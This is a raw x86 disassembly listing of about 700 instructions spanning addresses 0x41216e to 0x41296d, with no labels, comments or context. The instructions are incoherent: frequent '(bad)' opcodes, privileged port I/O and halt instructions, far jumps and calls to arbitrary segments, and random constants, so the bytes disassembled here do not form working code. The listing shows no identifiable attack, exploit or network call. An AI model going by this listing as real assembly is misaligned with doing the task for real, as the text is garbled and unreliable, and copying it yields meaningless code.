  41216e:	cmp    al,0xd7
  412170:	or     ecx,DWORD PTR [edi]
  412172:	jne    0x4121c3
  412174:	aas    
  412175:	sub    al,0xfd
  412177:	ds ins DWORD PTR es:[edi],dx
  412179:	xor    BYTE PTR [ebp+edx*2-0x76],0x2e
  41217e:	add    ecx,edx
  412180:	jge    0x4121ab
  412182:	ds je  0x4121de
  412185:	cdq    
  412186:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412187:	push   esp
  412188:	mov    ebx,cs
  41218a:	test   al,0xf3
  41218c:	sub    esi,DWORD PTR [esp+esi*8+0x73934f8c]
  412193:	fnsave [ebx+0x3382e47a]
  412199:	ins    BYTE PTR es:[edi],dx
  41219a:	cmp    ecx,DWORD PTR [edi+ebx*1-0x7cba385]
  4121a1:	and    edi,esp
  4121a3:	je     0x412179
  4121a5:	sub    esp,DWORD PTR [eax+0x497e9716]
  4121ab:	jmp    0x4121de
  4121ad:	push   ebx
  4121ae:	and    ch,dh
  4121b0:	xchg   DWORD PTR [ebx-0x5c],esi
  4121b3:	popf   
  4121b4:	xor    eax,0x56a2f4fe
  4121b9:	imul   ebx,DWORD PTR [edx],0x59
  4121bc:	fs cwde 
  4121be:	sbb    edx,ebp
  4121c0:	inc    edi
  4121c1:	aaa    
  4121c2:	jb     0x4121f0
  4121c4:	jge    0x412215
  4121c6:	adc    al,0x8a
  4121c8:	mov    ?,WORD PTR [eax]
  4121ca:	daa    
  4121cb:	push   ss
  4121cc:	ret    
  4121cd:	lods   eax,DWORD PTR ds:[esi]
  4121ce:	push   cs
  4121cf:	push   edi
  4121d0:	mov    ebx,0x29285c5e
  4121d5:	adc    ebx,DWORD PTR [eax-0x7cb149b1]
  4121db:	mov    cl,0x28
  4121dd:	arpl   WORD PTR [bp+di],bp
  4121e0:	pushf  
  4121e1:	xchg   ebx,eax
  4121e2:	sub    DWORD PTR [esp+ecx*2],esp
  4121e5:	xchg   esi,eax
  4121e6:	loopne 0x41223e
  4121e8:	add    bl,cl
  4121ea:	mov    ?,WORD PTR [bp+si-0x13]
  4121ee:	mov    al,ch
  4121f0:	(bad)  
  4121f1:	fdiv   DWORD PTR ds:0x77f68d9a
  4121f7:	pop    ebx
  4121f8:	xchg   esi,eax
  4121f9:	sub    ecx,DWORD PTR [ebx-0x1f16b557]
  4121ff:	or     BYTE PTR [eax-0x5e],dl
  412202:	sub    ebp,DWORD PTR [edx-0x1b184da5]
  412208:	xchg   esi,eax
  412209:	or     ah,BYTE PTR [ecx]
  41220b:	xor    dh,0x3f
  41220e:	and    dh,dh
  412210:	fisub  WORD PTR [edi]
  412212:	push   esp
  412213:	lods   eax,DWORD PTR ds:[esi]
  412214:	jg     0x412231
  412216:	repz xlat BYTE PTR ds:[ebx]
  412218:	pop    esp
  412219:	leave  
  41221a:	and    bl,BYTE PTR [esi+0x1439e6d7]
  412220:	push   esi
  412221:	retf   0x3b6c
  412224:	jb     0x41226a
  412226:	jae    0x412205
  412228:	jecxz  0x41225a
  41222a:	xor    al,0x86
  41222c:	pop    ss
  41222d:	rcr    DWORD PTR [esi-0x3e7f47c],1
  412233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412234:	jl     0x4121d5
  412236:	clc    
  412237:	sub    BYTE PTR ds:[ecx+0x2b],bh
  41223b:	stos   BYTE PTR es:[edi],al
  41223c:	into   
  41223d:	dec    edx
  41223e:	sub    cl,al
  412240:	ror    DWORD PTR [eax-0x4ef58014],cl
  412246:	mov    ah,0xfb
  412248:	xor    DWORD PTR [ecx-0x1ba7d1c8],edx
  41224e:	inc    DWORD PTR [edi]
  412250:	push   ecx
  412251:	loop   0x4121fd
  412253:	push   ss
  412254:	lahf   
  412255:	test   ah,cl
  412257:	nop
  412258:	add    DWORD PTR [ecx],ecx
  41225a:	pop    esi
  41225b:	test   al,0xba
  41225d:	pop    edx
  41225e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41225f:	fwait
  412260:	and    dl,al
  412262:	mov    dh,0xff
  412264:	(bad)  
  412265:	jge    0x412212
  412267:	shl    DWORD PTR [ebx-0x53],1
  41226a:	xor    eax,esi
  41226c:	add    dl,dl
  41226e:	mov    ds:0x86868e22,eax
  412273:	inc    esi
  412274:	cmp    DWORD PTR [ecx+0x71c6dc58],0xffffffca
  41227b:	retf   0x4771
  41227e:	lods   eax,DWORD PTR ds:[esi]
  41227f:	test   DWORD PTR [ebp-0x4c],edi
  412282:	dec    esi
  412283:	sub    esi,ecx
  412285:	lock mov edx,0x3f86d70d
  41228b:	lock dec edx
  41228d:	and    dh,BYTE PTR [ebx]
  41228f:	repnz sub esp,DWORD PTR [eax-0x1e90b943]
  412296:	sar    DWORD PTR [esi+0x135c843c],1
  41229c:	ja     0x412306
  41229e:	mov    ds:0x9b5ea8bc,eax
  4122a3:	shr    cl,cl
  4122a5:	rcl    bh,1
  4122a7:	jb     0x4122de
  4122a9:	xor    BYTE PTR [esi],cl
  4122ab:	call   0x4240bd9
  4122b0:	add    DWORD PTR [eax+0x74],0xb46bd17f
  4122b7:	dec    ebx
  4122b8:	jne    0x4122cf
  4122ba:	jmp    0x412309
  4122bc:	mov    eax,0x9fe728bc
  4122c1:	and    BYTE PTR [ebp+0x4393c650],bl
  4122c7:	pop    es
  4122c8:	and    eax,0x2158aaff
  4122cd:	jne    0x4122b2
  4122cf:	sbb    DWORD PTR [esi+0x72f8b16d],edx
  4122d5:	cmc    
  4122d6:	in     al,dx
  4122d7:	inc    esi
  4122d8:	inc    eax
  4122d9:	dec    ebp
  4122da:	ins    BYTE PTR es:[edi],dx
  4122db:	imul   ecx,DWORD PTR [ebp-0x4e59775b],0x14
  4122e2:	pop    eax
  4122e3:	mov    al,ds:0x1ce55f
  4122e8:	pushf  
  4122e9:	jle    0x4122a9
  4122eb:	xor    al,0x96
  4122ed:	dec    esp
  4122ee:	mov    WORD PTR [ebx+0x7663d243],gs
  4122f4:	sbb    BYTE PTR [ebx+0x1a],0xfe
  4122f8:	rcl    DWORD PTR [edi+0x7c9559d1],cl
  4122fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122ff:	mov    edi,0xcc78ac50
  412304:	jmp    0x8fec:0x6633f2e3
  41230b:	pop    ds
  41230c:	(bad)  
  41230d:	mov    edi,0x1bbe991
  412312:	mov    ebp,0x6babcade
  412317:	jnp    0x41234d
  412319:	in     al,dx
  41231a:	in     eax,dx
  41231b:	call   0xcd1d:0xe5238871
  412322:	jmp    0x5a4e:0xc5bdf494
  412329:	pushf  
  41232a:	xchg   BYTE PTR [edi+eax*2+0x7d],al
  41232e:	dec    edi
  41232f:	mov    bl,0x75
  412331:	pop    ebp
  412332:	jns    0x4122fc
  412334:	imul   eax,DWORD PTR [ebx+ecx*1+0x57],0xffffffba
  412339:	mov    BYTE PTR [ecx+ebp*2],0x2b
  41233d:	dec    esi
  41233e:	shl    DWORD PTR [ebp-0x70fd0372],cl
  412344:	popf   
  412345:	mov    edx,0xa28abaac
  41234a:	out    dx,eax
  41234b:	fcom   DWORD PTR [ebx-0x6a]
  41234e:	out    0x2b,eax
  412350:	ds xor al,0x6
  412353:	mov    al,0x10
  412355:	pusha  
  412356:	xchg   esi,eax
  412357:	push   eax
  412358:	ins    DWORD PTR es:[edi],dx
  412359:	int    0xe
  41235b:	(bad)  [edi+0x7eb7d5f7]
  412361:	xchg   edi,eax
  412362:	int3   
  412363:	add    ah,BYTE PTR [eax-0x2]
  412366:	shr    BYTE PTR [esi-0x2d0896ec],1
  41236c:	outs   dx,BYTE PTR ds:[esi]
  41236d:	imul   edi,DWORD PTR [ebx+0x32],0xffffffc8
  412371:	lock scas eax,DWORD PTR es:[edi]
  412373:	test   DWORD PTR [edi+0x62],esp
  412376:	mov    ecx,0xa6000461
  41237b:	mov    ds:0x2e12f799,eax
  412380:	test   BYTE PTR [eax-0x5f],bh
  412383:	in     al,dx
  412384:	xor    dl,BYTE PTR [esi]
  412386:	loope  0x41236b
  412388:	adc    DWORD PTR [ebp+0x38b518bf],ebp
  41238e:	ds jno 0x412318
  412391:	fsubr  QWORD PTR [ecx]
  412393:	daa    
  412394:	pop    ss
  412395:	retf   0xd152
  412398:	loope  0x4123a0
  41239a:	lock pushf 
  41239c:	mov    eax,ds:0x898aa75e
  4123a1:	enter  0x2b52,0xec
  4123a5:	xchg   esi,eax
  4123a6:	ficomp DWORD PTR fs:[ecx+0x6d]
  4123aa:	in     al,dx
  4123ab:	jno    0x412421
  4123ad:	dec    ebp
  4123ae:	pop    esp
  4123af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123b0:	in     eax,dx
  4123b1:	add    al,0x78
  4123b3:	push   ecx
  4123b4:	clc    
  4123b5:	xchg   BYTE PTR [ebx+0x37],ch
  4123b8:	out    0x39,eax
  4123ba:	mov    ebx,0xe998d193
  4123bf:	push   esp
  4123c0:	fdivr  DWORD PTR [edx]
  4123c2:	loope  0x41241d
  4123c4:	dec    esi
  4123c5:	out    0xf6,eax
  4123c7:	loopne 0x412428
  4123c9:	or     DWORD PTR [ebx-0x4da01323],ebx
  4123cf:	test   DWORD PTR [ecx-0x2f],edi
  4123d2:	mov    bl,0x2f
  4123d4:	mov    dl,0x15
  4123d6:	push   edi
  4123d7:	adc    al,0xd9
  4123d9:	fwait
  4123da:	xchg   esp,eax
  4123db:	test   BYTE PTR [ebp+0x4151b6e2],ch
  4123e1:	jnp    0x412448
  4123e3:	mov    ebp,DWORD PTR [ecx+0x8]
  4123e6:	mov    esp,esi
  4123e8:	sub    eax,0x4b800a7b
  4123ed:	pushf  
  4123ee:	push   ecx
  4123ef:	and    eax,0x95ae1391
  4123f4:	ins    DWORD PTR es:[edi],dx
  4123f5:	xchg   ecx,eax
  4123f6:	or     bh,BYTE PTR [esp+edi*1-0x5c0dba4]
  4123fd:	cmp    bh,dl
  4123ff:	std    
  412400:	fs dec esi
  412402:	mov    eax,DWORD PTR ds:0xa8dfaaef
  412408:	adc    esp,ecx
  41240a:	sbb    DWORD PTR [ebx+0x5],edx
  41240d:	inc    edx
  41240e:	xchg   esi,eax
  41240f:	dec    edi
  412410:	adc    eax,0x1962db99
  412415:	or     esi,edx
  412417:	in     al,dx
  412418:	or     DWORD PTR [ebx+0x52680df5],eax
  41241e:	popa   
  41241f:	xchg   esp,eax
  412420:	in     al,0xc4
  412422:	rcl    DWORD PTR [edi-0x24],1
  412425:	pushf  
  412426:	jp     0x412449
  412428:	sub    ebx,ecx
  41242a:	repz fisttp WORD PTR [edx+0x5239c302]
  412431:	jnp    0x4123dc
  412433:	popa   
  412434:	lahf   
  412435:	adc    bl,BYTE PTR [eax+0x2b2d4e67]
  41243b:	inc    ecx
  41243c:	mov    ebx,0x63fb48bb
  412441:	retf   0xdc17
  412444:	and    al,0xc8
  412446:	dec    ecx
  412447:	xor    DWORD PTR [esi+eax*4-0x12],ecx
  41244b:	dec    edi
  41244c:	add    BYTE PTR [esi],bl
  41244e:	jp     0x4123d0
  412450:	sub    bh,BYTE PTR [eax+ebp*2-0x4e77800e]
  412457:	shr    DWORD PTR [edi+eax*4-0x367d440e],0xab
  41245f:	mov    ebp,edx
  412461:	jnp    0x412422
  412463:	push   es
  412464:	call   0xd766:0xd44422a7
  41246b:	push   0xffffff89
  41246d:	or     DWORD PTR ds:0xd3dc2baf,esi
  412473:	cld    
  412474:	das    
  412475:	and    eax,0xfd383f68
  41247a:	pop    edx
  41247b:	jo     0x412416
  41247d:	cmp    DWORD PTR [ebx-0x2],ecx
  412480:	adc    esi,DWORD PTR [ecx+0x19]
  412483:	les    esi,FWORD PTR [ebp+0x71e806a0]
  412489:	and    DWORD PTR [ecx-0x694e0736],0x17
  412490:	inc    edi
  412491:	cli    
  412492:	pop    ecx
  412493:	in     al,0x3d
  412495:	pop    edi
  412496:	je     0x412420
  412498:	enter  0xfc3b,0xe5
  41249c:	fcomp  DWORD PTR [esi]
  41249e:	mov    cl,0x7c
  4124a0:	fist   WORD PTR [ecx-0x6a5c053]
  4124a6:	push   0x4051cc36
  4124ab:	imul   esp,DWORD PTR [ecx-0x77],0x7b
  4124af:	in     al,dx
  4124b0:	lea    edx,[ebx-0x76]
  4124b3:	int    0xa4
  4124b5:	and    dh,0x92
  4124b8:	adc    BYTE PTR [ebx-0x72],0xef
  4124bc:	jmp    0x41247d
  4124be:	and    esi,DWORD PTR [ebx]
  4124c0:	mov    bl,dh
  4124c2:	adc    DWORD PTR [eax+0x11],edx
  4124c5:	push   edx
  4124c6:	dec    edx
  4124c7:	lods   al,BYTE PTR ds:[esi]
  4124c8:	hlt    
  4124c9:	mov    ds:0xb0413019,al
  4124ce:	test   BYTE PTR [edx],al
  4124d0:	xchg   ebp,eax
  4124d1:	jnp    0x4124a3
  4124d3:	dec    edi
  4124d4:	sbb    BYTE PTR [ecx+0x4c],0x85
  4124d8:	in     al,dx
  4124d9:	add    al,0xf5
  4124db:	inc    esp
  4124dc:	js     0x412528
  4124de:	add    esp,DWORD PTR [esi+ebx*8]
  4124e1:	pushf  
  4124e2:	arpl   si,si
  4124e4:	test   al,0xd6
  4124e6:	sbb    edx,edx
  4124e8:	inc    edi
  4124e9:	adc    al,0xe5
  4124eb:	inc    ebx
  4124ec:	and    DWORD PTR [ebp-0x3f],esp
  4124ef:	dec    ecx
  4124f0:	mov    dl,0xe
  4124f2:	ret    
  4124f3:	push   ebp
  4124f5:	cli    
  4124f6:	mov    ?,WORD PTR ds:0xf8502021
  4124fc:	xchg   edx,eax
  4124fd:	xor    eax,0xc03aa888
  412502:	hlt    
  412503:	mov    edx,0x44d6c01a
  412508:	pop    esi
  412509:	dec    eax
  41250a:	inc    ebp
  41250b:	xchg   edi,eax
  41250c:	pop    ss
  41250d:	aad    0xc3
  41250f:	mov    dh,0xa7
  412511:	out    dx,eax
  412512:	lea    ecx,[edx]
  412514:	pusha  
  412515:	retf   0x388
  412518:	out    dx,eax
  412519:	cmp    eax,0xedafb155
  41251e:	sub    BYTE PTR [eax],ch
  412520:	xchg   ebx,eax
  412521:	repnz test bh,ah
  412524:	push   0xad3e443e
  412529:	pop    ss
  41252a:	sbb    esi,DWORD PTR [ecx+0x27]
  41252d:	mov    al,ds:0xeaef7a2
  412532:	loope  0x41251b
  412534:	xchg   edx,eax
  412535:	bound  ecx,QWORD PTR [ecx+0x653fd89a]
  41253b:	sti    
  41253c:	stos   DWORD PTR es:[edi],eax
  41253d:	sub    eax,0x91fd59da
  412542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412543:	stc    
  412544:	lds    ecx,FWORD PTR [ebp-0x772ce188]
  41254a:	jl     0x41251c
  41254c:	sub    dh,BYTE PTR [ecx-0x69801c06]
  412552:	ror    BYTE PTR [ebp-0x16],0x43
  412556:	sbb    al,0x2c
  412558:	out    0x51,eax
  41255a:	cs leave 
  41255c:	inc    edi
  41255d:	cmovo  edx,ebp
  412560:	xchg   edx,eax
  412561:	mov    dh,dl
  412563:	add    DWORD PTR ds:0x5598ae85,esi
  412569:	enter  0xd9c3,0xe8
  41256d:	jl     0x412544
  41256f:	pop    esp
  412570:	inc    ebp
  412571:	and    dh,BYTE PTR [ebp-0x2c144acc]
  412577:	ds inc eax
  412579:	icebp  
  41257a:	add    BYTE PTR [edi+0x44],0x99
  41257e:	pop    edi
  41257f:	out    0xe0,eax
  412581:	cmp    edi,eax
  412583:	jg     0x41258b
  412585:	(bad)  
  412587:	cli    
  412588:	daa    
  412589:	and    bh,BYTE PTR [edx+edi*2+0x7d923df2]
  412590:	cwde   
  412591:	push   esi
  412592:	add    dl,cl
  412594:	mov    al,ds:0x432d056
  412599:	das    
  41259a:	cmc    
  41259b:	sti    
  41259c:	jo     0x4125b4
  41259e:	(bad)  
  41259f:	into   
  4125a0:	xchg   ebx,eax
  4125a1:	jo     0x412565
  4125a3:	inc    esi
  4125a4:	ja     0x412544
  4125a6:	cmp    eax,0x4d72d487
  4125ab:	xchg   BYTE PTR [ebp+0x26b108b4],bh
  4125b1:	out    0x26,al
  4125b3:	ror    DWORD PTR [edx-0x17],0x10
  4125b7:	enter  0x897f,0x9f
  4125bb:	mov    ch,0xee
  4125bd:	sub    ch,BYTE PTR [ecx]
  4125bf:	cmp    DWORD PTR [ebx-0x12],0xffffffea
  4125c3:	test   DWORD PTR [eax],0x1c3e93c3
  4125c9:	and    al,0x58
  4125cb:	mov    edi,0x189cb621
  4125d0:	sub    eax,0x33cd51db
  4125d5:	hlt    
  4125d6:	fidiv  DWORD PTR [eax+0x15]
  4125d9:	stos   BYTE PTR es:[edi],al
  4125da:	dec    ebp
  4125db:	sar    bl,1
  4125dd:	inc    ebx
  4125de:	dec    ecx
  4125df:	xlat   BYTE PTR ds:[ebx]
  4125e0:	xchg   edi,eax
  4125e1:	stos   DWORD PTR es:[edi],eax
  4125e2:	mov    al,ds:0x799bc6ff
  4125e7:	add    eax,DWORD PTR [esi-0x26]
  4125ea:	(bad)
  4125ed:	sbb    al,0x93
  4125ef:	jne    0x412599
  4125f1:	jg     0x4125af
  4125f3:	fsub   DWORD PTR ds:0x166150eb
  4125f9:	outs   dx,DWORD PTR ds:[esi]
  4125fa:	loopne 0x412599
  4125fc:	lods   al,BYTE PTR ds:[esi]
  4125fd:	jp     0x412674
  4125ff:	or     DWORD PTR [edx+0x64],esp
  412602:	test   BYTE PTR [ebp+0x3],0xa
  412606:	push   ebp
  412607:	adc    esp,DWORD PTR [ebx-0x34]
  41260a:	inc    edi
  41260b:	cmp    eax,0x622d0510
  412610:	xor    ebp,DWORD PTR [ebx]
  412612:	lock and al,0xab
  412615:	sbb    BYTE PTR [eax-0x5e7e5223],al
  41261b:	push   esi
  41261c:	jae    0x412657
  41261e:	mov    ds:0xfbdb98df,al
  412623:	sbb    cl,BYTE PTR [edi+0x135f5cfd]
  412629:	xchg   esp,eax
  41262a:	ret    0x45a0
  41262d:	bound  eax,QWORD PTR [ecx]
  41262f:	hlt    
  412630:	sub    edi,DWORD PTR [ecx+0x2c]
  412633:	lock inc eax
  412635:	xchg   esp,eax
  412636:	shr    BYTE PTR [ebp-0x43c41503],0x51
  41263d:	xor    al,0x5f
  41263f:	in     al,0xb2
  412641:	mov    al,0x55
  412643:	dec    edi
  412644:	adc    DWORD PTR [edx+eax*8],ebx
  412647:	mov    esi,0xd81557d
  41264c:	dec    esi
  41264d:	fcomp  DWORD PTR [edi]
  41264f:	mov    ch,0x9d
  412651:	(bad)  [edx]
  412653:	sub    edx,edx
  412655:	mov    DWORD PTR ds:0x46a5e396,esi
  41265b:	xchg   edi,eax
  41265c:	pop    esp
  41265d:	loopne 0x41264e
  41265f:	and    eax,DWORD PTR [edi]
  412661:	out    dx,al
  412662:	mov    esi,0xa108202d
  412667:	dec    eax
  412668:	sar    DWORD PTR [ebx],1
  41266a:	push   es
  41266b:	add    DWORD PTR [eax],0xffffffcc
  41266e:	xchg   esi,eax
  41266f:	jbe    0x4126bf
  412671:	mov    cl,0xfa
  412673:	fst    DWORD PTR [edx-0x79f3d83a]
  412679:	sbb    bh,BYTE PTR [esi]
  41267b:	loop   0x412632
  41267d:	stc    
  41267e:	mov    al,al
  412680:	add    BYTE PTR [edi+ecx*1+0x5c],ah
  412684:	int    0xfe
  412686:	jmp    0x63e6:0xa9d9ebc9
  41268d:	jp     0x412699
  41268f:	(bad)  
  412691:	add    DWORD PTR [edi+edi*4+0x39cad0b3],esi
  412698:	out    0x71,eax
  41269a:	jb     0x412694
  41269c:	pop    es
  41269d:	shl    DWORD PTR [edi+0x19472b62],0xb
  4126a4:	fsubr  st,st(3)
  4126a6:	stc    
  4126a7:	jecxz  0x4126f6
  4126a9:	call   0x3054a57b
  4126ae:	jns    0x412700
  4126b0:	fsubrp st(0),st
  4126b2:	xor    BYTE PTR [esi+0x683e85ce],cl
  4126b8:	jp     0x41269c
  4126ba:	push   ds
  4126bb:	cmc    
  4126bc:	cmp    BYTE PTR [edx+ecx*2],al
  4126bf:	fmulp  st(4),st
  4126c1:	loop   0x4126d8
  4126c3:	fst    DWORD PTR [esi-0xa]
  4126c6:	rcr    DWORD PTR [ebx],1
  4126c8:	ror    BYTE PTR [eax-0x3c1810e8],cl
  4126ce:	jp     0x4126c4
  4126d0:	lock (bad) 
  4126d2:	and    DWORD PTR [ecx],esp
  4126d4:	mov    eax,DWORD PTR [esi+edi*4-0x4c]
  4126d8:	sbb    esi,DWORD PTR [esi-0x77f0c959]
  4126de:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4126e0:	pusha  
  4126e1:	xchg   edx,eax
  4126e2:	and    eax,0x6770c8cc
  4126e7:	push   0xffffff8b
  4126e9:	xor    eax,0x91b0b4cb
  4126ee:	mov    esp,0xf6fb1c3a
  4126f3:	sub    cl,ch
  4126f5:	rcr    dh,1
  4126f7:	push   ss
  4126f8:	mov    edi,0x9d76063
  4126fd:	cwde   
  4126fe:	adc    al,0x12
  412700:	fsub   st,st(3)
  412702:	or     bl,ch
  412704:	jns    0x4126a4
  412706:	test   BYTE PTR [eax-0x54],bh
  412709:	mov    ds:0x61412ac3,al
  41270e:	sbb    BYTE PTR [eax],al
  412710:	xor    bl,dh
  412712:	rcl    BYTE PTR [ebx+0x5d],1
  412715:	aaa    
  412716:	nop
  412717:	pusha  
  412718:	cs mov esi,0xcd3e5ed3
  41271e:	mov    ecx,0xe108a0b4
  412723:	popf   
  412724:	sahf   
  412725:	jp     0x41279a
  412727:	pushf  
  412728:	cwde   
  412729:	fcomi  st,st(5)
  41272b:	cwde   
  41272c:	inc    esi
  41272d:	push   0x83c2c579
  412732:	fisub  WORD PTR ds:0xb7e9a970
  412738:	pop    eax
  412739:	dec    esp
  41273a:	shl    ebx,cl
  41273c:	popf   
  41273d:	or     BYTE PTR [ebx+0x6fc69da3],0xef
  412744:	jp     0x412751
  412746:	cmc    
  412747:	inc    esi
  412748:	jmp    0x4126da
  41274a:	mov    eax,0xdbd2737
  41274f:	jns    0x41270f
  412751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412752:	pushf  
  412753:	push   0xf9254b7f
  412758:	jo     0x412774
  41275a:	loop   0x4127af
  41275c:	popa   
  41275d:	popf   
  41275e:	mov    cs,WORD PTR [eax-0x8]
  412761:	test   DWORD PTR [ebx-0x5a],edi
  412764:	hlt    
  412765:	scas   eax,DWORD PTR es:[edi]
  412766:	dec    edx
  412767:	shr    DWORD PTR [eax+0x71f0f587],1
  41276d:	int    0x71
  41276f:	xchg   ecx,eax
  412770:	or     DWORD PTR [esi],0x31
  412773:	mov    cl,0x3c
  412775:	mov    edi,0x51bf75b3
  41277a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41277b:	xor    dl,BYTE PTR [ebx-0x75c7c2b8]
  412781:	dec    edi
  412782:	fcomp  QWORD PTR [ebp+0x41]
  412785:	push   esp
  412786:	out    0x38,eax
  412788:	out    dx,eax
  412789:	int3   
  41278a:	sub    ebp,ecx
  41278c:	lods   eax,DWORD PTR ds:[esi]
  41278d:	imul   edx,DWORD PTR [eax-0x46],0xd702e369
  412794:	shld   ebp,edx,cl
  412797:	imul   edi,edi,0x90853aa4
  41279d:	xchg   BYTE PTR [esi],ah
  41279f:	mov    edx,0xe4555c0a
  4127a4:	mov    ah,0x93
  4127a6:	push   ebp
  4127a7:	jno    0x4127ce
  4127a9:	sub    DWORD PTR [eax-0x27],0xddcc3bf0
  4127b0:	ins    DWORD PTR es:[edi],dx
  4127b1:	out    dx,eax
  4127b2:	cmp    eax,0x92756c19
  4127b7:	test   al,0x85
  4127b9:	pop    ebp
  4127ba:	call   0xd36c5de0
  4127bf:	sbb    eax,0x668cc146
  4127c4:	int3   
  4127c5:	ins    DWORD PTR es:[edi],dx
  4127c6:	shr    BYTE PTR [esi+esi*1-0x49b354d7],cl
  4127cd:	add    esi,DWORD PTR [edx+0x9]
  4127d0:	hlt    
  4127d1:	out    0xb3,eax
  4127d3:	xchg   ebp,eax
  4127d4:	mov    edi,0xa7cc4358
  4127d9:	fs sti 
  4127db:	test   edx,ecx
  4127dd:	or     eax,0x6e856124
  4127e2:	add    ah,BYTE PTR [ebx-0x1071ef9a]
  4127e8:	ror    DWORD PTR [esp+eax*1+0x4f],1
  4127ec:	inc    edi
  4127ed:	dec    esi
  4127ee:	mov    ebx,0xb978f935
  4127f3:	add    eax,0xa4820830
  4127f8:	mov    ebp,0x40f41eb
  4127fd:	dec    esi
  4127fe:	pop    esp
  4127ff:	rcl    BYTE PTR [edx+0x59],0xae
  412803:	sbb    eax,0xd18e958d
  412808:	mov    ds:0xd45eb350,eax
  41280d:	mov    BYTE PTR [esi+0x2e3f8a85],cl
  412813:	(bad)  
  412814:	adc    DWORD PTR [esi-0x9],esp
  412817:	loop   0x41288b
  412819:	mov    DWORD PTR [esi-0x2bd83340],ecx
  41281f:	and    eax,0x7d5c5730
  412824:	pop    ecx
  412825:	xchg   edx,eax
  412826:	jnp    0x4127ec
  412828:	call   0x896d553d
  41282d:	aaa    
  41282e:	add    al,0x4
  412830:	and    DWORD PTR [esi],ebp
  412832:	push   esi
  412833:	in     eax,0xaf
  412835:	add    eax,0x9c76916d
  41283a:	js     0x4127c9
  41283c:	repnz mov dl,0x5e
  41283f:	(bad)  
  412841:	mov    DWORD PTR [edi+ebp*2-0x3d],ebx
  412845:	jbe    0x412839
  412847:	inc    eax
  412848:	popa   
  412849:	cmp    edi,DWORD PTR [ecx+0x33]
  41284c:	mov    bl,0x2d
  41284e:	xor    BYTE PTR [edx+esi*1-0x6247062f],cl
  412855:	retf   
  412856:	jne    0x412819
  412858:	addr16 ror edi,1
  41285b:	adc    eax,0x2cde1e9f
  412860:	push   esi
  412861:	shr    BYTE PTR [ecx+0x78],1
  412864:	imul   esi,edx,0x20068935
  41286a:	mov    ebx,0x6ddfdc3e
  41286f:	fwait
  412870:	or     al,BYTE PTR fs:[edx+edx*4+0x1b2cc9ad]
  412878:	push   0xffffffa2
  41287a:	(bad)
  41287e:	cmp    al,0x31
  412880:	out    0xed,eax
  412882:	cmp    al,0x4c
  412884:	push   ebp
  412885:	in     al,0xd5
  412887:	in     eax,dx
  412888:	and    ebx,DWORD PTR [esp+edi*1]
  41288b:	cmp    BYTE PTR ds:0xb1f051b9,bh
  412891:	mov    dh,0x13
  412893:	push   eax
  412894:	inc    ecx
  412895:	outs   dx,BYTE PTR ds:[esi]
  412896:	pusha  
  412897:	add    al,0x6f
  412899:	mov    cl,0x63
  41289b:	rol    BYTE PTR [edi],0xfb
  41289e:	or     al,0xe6
  4128a0:	add    al,0xe0
  4128a2:	mov    al,0xc7
  4128a4:	mov    ?,WORD PTR [eax]
  4128a6:	or     eax,0x6f44463d
  4128ab:	daa    
  4128ac:	mov    ecx,0x4f3a619c
  4128b1:	and    bl,BYTE PTR [ebp+0x72b2a6ee]
  4128b7:	xchg   ecx,eax
  4128b8:	lea    edx,[eax*2-0x45c56b9d]
  4128bf:	loopne 0x4128d8
  4128c1:	ret    
  4128c2:	out    0x9c,al
  4128c4:	sub    esi,DWORD PTR [esi]
  4128c6:	lahf   
  4128c7:	stos   BYTE PTR es:[edi],al
  4128c8:	in     eax,dx
  4128c9:	mov    ecx,ebp
  4128cb:	repz pop DWORD PTR [esi-0x73]
  4128cf:	xor    al,0x2c
  4128d1:	push   ecx
  4128d2:	loope  0x4128b2
  4128d4:	ss dec ebx
  4128d6:	mov    BYTE PTR [ecx+0x14],dh
  4128d9:	pop    ecx
  4128da:	mov    bl,0x1e
  4128dc:	mov    ss,WORD PTR [edi-0x2c9ddd5]
  4128e2:	rol    ah,0xd7
  4128e5:	icebp  
  4128e6:	outs   dx,BYTE PTR ds:[esi]
  4128e7:	popf   
  4128e8:	stos   DWORD PTR es:[edi],eax
  4128e9:	(bad)  
  4128ea:	push   ss
  4128eb:	mov    BYTE PTR [ebp-0x76],bl
  4128ee:	mov    eax,ds:0x4e639755
  4128f3:	jle    0x412952
  4128f5:	mov    ebx,0xf91152ae
  4128fa:	sub    dl,BYTE PTR [ebp+0x663d5c61]
  412900:	fs jae 0x4128a0
  412903:	pop    esi
  412904:	push   eax
  412905:	loope  0x412909
  412907:	mov    ebx,0x5516735e
  41290c:	pop    edx
  41290d:	mov    bh,BYTE PTR [ecx-0x1e]
  412910:	fwait
  412911:	jo     0x4128c3
  412913:	mov    ds,WORD PTR [ebx+0x37]
  412916:	lods   al,BYTE PTR ds:[esi]
  412917:	mov    WORD PTR [edi+ecx*1+0x63],ss
  41291b:	xchg   edi,eax
  41291c:	pop    ds
  41291d:	pop    edx
  41291e:	xor    BYTE PTR [ecx+0x5c3e0ebd],dh
  412924:	jne    0x4128fb
  412926:	fild   DWORD PTR [ebx+eax*4]
  412929:	adc    eax,0x6211cf0e
  41292e:	test   DWORD PTR [ebx-0x65f3a4ba],0x297b7ffc
  412938:	and    eax,0x3bb75c63
  41293d:	aad    0xde
  41293f:	dec    ecx
  412940:	pop    ds
  412941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412942:	dec    ecx
  412943:	adc    cl,ah
  412945:	inc    ebx
  412946:	pop    ebx
  412947:	inc    esi
  412948:	rol    DWORD PTR [ebp+0x77],0xdd
  41294c:	mov    dl,0x85
  41294e:	inc    ecx
  41294f:	hlt    
  412950:	adc    eax,DWORD PTR [esi+0x59]
  412953:	mov    dl,0x76
  412955:	jge    0x41298c
  412957:	(bad)  
  412959:	aad    0xaa
  41295b:	sub    al,0x55
  41295d:	(bad)  
  41295e:	fimul  WORD PTR [edi]
  412960:	xor    BYTE PTR [edi],0xc3
  412963:	dec    edx
  412964:	(bad)  
  412967:	ficomp DWORD PTR [ebx+0x662d0c4f]
  41296d:	pop    eax
